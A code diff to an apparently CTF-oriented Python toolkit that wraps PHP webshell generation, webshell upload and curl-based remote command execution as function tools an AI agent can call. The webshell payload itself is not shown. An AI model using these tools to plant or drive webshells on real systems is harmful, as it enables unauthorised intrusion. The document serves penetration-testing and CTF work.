@@ -2,9 +2,13 @@
 PHP webshell and curl utilities for web exploitation
 """
 
+from typing import Union, Tuple
+from cai.sdk.agents import function_tool
 
-def generate_php_webshell(target_url=None, port=None,
-                          protocol="http", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
+
+@function_tool
+def generate_php_webshell(target_url: str = None, port: int = None,
+                          protocol: str = "http", ctf=None) -> Union[str, Tuple[str, str]]:  # pylint: disable=unused-argument  # noqa: E501
     """
     Upload and generate a basic PHP webshell and uploads it via HTTP or FTP
 
@@ -37,7 +41,8 @@ def generate_php_webshell(target_url=None, port=None,
     return webshell, upload_cmd
 
 
-def curl_webshell(url, command, cmd_param="cmd"):
+@function_tool
+def curl_webshell(url: str, command: str, cmd_param: str = "cmd") -> str:
     """
     Sends command to PHP webshell via curl
 
@@ -53,7 +58,8 @@ def curl_webshell(url, command, cmd_param="cmd"):
     return f"curl '{url}?{cmd_param}={encoded_cmd}'"
 
 
-def upload_webshell(url, filename="shell.php", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
+@function_tool
+def upload_webshell(url: str, filename: str = "shell.php", ctf=None) -> Tuple[str, str]:  # pylint: disable=unused-argument  # noqa: E501
     """
     Generates curl command to upload PHP webshell
 
